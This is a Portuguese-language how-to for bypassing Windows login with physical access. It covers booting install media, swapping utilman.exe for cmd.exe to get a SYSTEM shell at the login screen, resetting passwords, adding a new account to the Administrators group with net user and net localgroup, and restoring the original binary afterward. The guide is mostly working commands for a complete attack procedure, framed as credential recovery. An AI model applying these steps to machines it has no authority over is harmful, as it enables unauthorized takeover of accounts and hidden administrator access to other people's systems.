## Procedimento de Bypass de Autenticação (Acesso Físico)

***(Utilizando o `Utilman.exe` na mídia de instalação do Windows)***

Este método permite a elevação de privilégios (`SYSTEM`) na tela de login para fins de recuperação ou alteração de credenciais, explorando a função de Acessibilidade (`Utilman.exe`).

### Pré-requisito

  * Mídia de instalação ou recuperação do Windows (USB ou DVD).
  * Acesso físico ao sistema alvo.

### Etapa 1: Preparação do Ambiente

1.  **Inicialize (Boot)** o sistema a partir da mídia de instalação do Windows.
2.  Na primeira tela de configuração, pressione **`Shift` + `F10`** para abrir o *Prompt de Comando* (`cmd`).
3.  Utilize o comando `diskpart` ou `wmic logicaldisk get Caption` para **identificar a letra da unidade** onde o sistema operacional Windows está instalado (ex: `C:`).

### Etapa 2: Substituição do Binário

Navegue até o diretório `System32` e substitua o executável de Acessibilidade (`Utilman.exe`) pelo *Prompt de Comando* (`cmd.exe`).

```bash
cd /d C:\Windows\System32
copy utilman.exe utilman.exe.bak
copy cmd.exe utilman.exe
```

### Etapa 3: Execução do Bypass

1.  **Reinicie** o sistema normalmente (remova a mídia de instalação).
2.  Na tela de login do Windows, clique no **ícone de Acessibilidade** (*Ease of Access*). O `cmd.exe` será executado, mas com privilégios de **`SYSTEM`**.

### Etapa 4: Gerenciamento de Contas

No *prompt* com privilégios de `SYSTEM`, realize a ação desejada:

| Objetivo | Comando |
| :--- | :--- |
| **Trocar Senha** | `net user [usuário] [NovaSenha]` |
| *Exemplo:* | `net user joana NovaSenha123` |
| **Criar/Promover Conta** | `net user [usuário] [senha] /add` <br> `net localgroup Administradores [usuário] /add` |
| *Exemplo:* | `net user novo_admin SenhaSegura /add` <br> `net localgroup Administradores novo_admin /add` |

### Etapa 5: Restauração da Configuração Original

Para restaurar a integridade do sistema, o binário original deve ser recolocado.

1.  Repita a **Etapa 1** (Boot pela mídia de instalação e abrir `cmd`).
2.  Restaure o `Utilman.exe` a partir do *backup* (`.bak`).

<!-- end list -->

```bash
cd /d C:\Windows\System32
copy utilman.exe.bak utilman.exe
del utilman.exe.bak
```

3.  Reinicie o sistema normalmente.
